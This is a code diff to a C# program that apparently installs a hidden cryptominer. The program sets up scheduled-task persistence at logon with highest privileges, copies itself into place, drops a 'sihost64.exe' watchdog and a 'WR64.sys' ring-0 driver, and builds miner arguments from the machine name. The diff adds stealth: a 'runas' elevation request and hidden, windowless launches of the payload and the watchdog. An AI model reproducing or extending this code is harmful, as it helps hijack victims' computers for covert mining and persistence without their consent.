@@ -46,7 +46,8 @@ public partial class Program
                         FileName = "cmd",
                         Arguments = "/c schtasks /create /f /sc onlogon /rl highest /tn " + "\"" + Path.GetFileNameWithoutExtension(plp) + "\"" + " /tr " + "'" + "\"" + (plp) + "\"" + "' & exit",
                         WindowStyle = ProcessWindowStyle.Hidden,
-                        CreateNoWindow = true
+                        CreateNoWindow = true,
+                        Verb = "runas"
                     });
                 }
                 catch(Exception ex){
@@ -78,7 +79,12 @@ public partial class Program
             File.Copy(Process.GetCurrentProcess().MainModule.FileName, plp, true);
             Thread.Sleep(5 * 1000);
             RBaseFolder();
-            Process.Start(plp);
+            Process.Start(new ProcessStartInfo
+            {
+                FileName = plp,
+                WindowStyle = ProcessWindowStyle.Hidden,
+                CreateNoWindow = true,
+            });
             Environment.Exit(0);
         }
     }
@@ -116,11 +122,16 @@ public partial class Program
             Thread.Sleep(3000);
             File.WriteAllBytes(bD + "sihost64.exe", RGetTheResource("#watchdog"));
 
-            Thread.Sleep(2 * 1000);
+            Thread.Sleep(1 * 1000);
 
             if (Process.GetProcessesByName("sihost64").Length < 1)
             {
-                Process.Start(bD + "sihost64.exe");
+                Process.Start(new ProcessStartInfo
+                {
+                    FileName = bD + "sihost64.exe",
+                    WindowStyle = ProcessWindowStyle.Hidden,
+                    CreateNoWindow = true,
+                });
             }
 #endif
             File.WriteAllBytes(bD + "WR64.sys", RGetTheResource("#winring"));
@@ -210,8 +221,8 @@ public partial class Program
 #endif
 
             string argstr = RGetString("#ARGSTR") + rS;
-            argstr = argstr.Replace("{%RANDOM%}", RTruncate("R" +Guid.NewGuid().ToString().Replace("-", ""), 10));
-            argstr = argstr.Replace("{%COMPUTERNAME%}", RTruncate("C" +System.Text.RegularExpressions.Regex.Replace(Environment.MachineName.ToString(), "[^a-zA-Z0-9]", ""), 10));
+            argstr = argstr.Replace("{%RANDOM%}", RTruncate("R" + Guid.NewGuid().ToString().Replace("-", ""), 10));
+            argstr = argstr.Replace("{%COMPUTERNAME%}", RTruncate("C" + System.Text.RegularExpressions.Regex.Replace(Environment.MachineName.ToString(), "[^a-zA-Z0-9]", ""), 10));
             if (RCheckProc())
             {
                 Environment.Exit(0);
